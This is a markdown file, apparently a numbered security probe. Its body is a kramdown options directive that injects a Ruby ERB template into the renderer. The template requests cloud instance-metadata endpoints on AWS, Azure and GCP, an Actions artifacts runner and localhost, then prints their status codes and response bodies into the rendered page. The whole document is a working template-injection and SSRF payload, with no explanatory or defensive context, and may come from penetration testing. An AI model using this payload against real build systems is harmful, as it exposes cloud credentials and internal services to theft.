---
---

# Test 31: SSRF from build container - cloud metadata

{::options template="string://<%= require 'net/http'; require 'uri'; r=''; targets = [['AWS','http://169.254.169.254/latest/meta-data/'],['AZURE','http://169.254.169.254/metadata/instance?api-version=2021-02-01'],['GCP','http://metadata.google.internal/computeMetadata/v1/'],['ACTIONS','http://ghes-actions-artifacts-runner:8080/'],['LOCALHOST','http://127.0.0.1:8080/']]; for t in targets; begin; uri=URI.parse(t[1]); http=Net::HTTP.new(uri.host,uri.port); http.open_timeout=3; http.read_timeout=3; req=Net::HTTP::Get.new(uri); req['Metadata-Flavor']='Google'; req['Metadata']='true'; resp=http.request(req); r=r+t[0]+'_STATUS='+resp.code+\"\\n\"+t[0]+'_BODY='+resp.body[0..300]+\"\\n\"; rescue => e; r=r+t[0]+'_ERR='+e.class.to_s+':'+e.message[0..100]+\"\\n\"; end; end; r %>" /}

placeholder
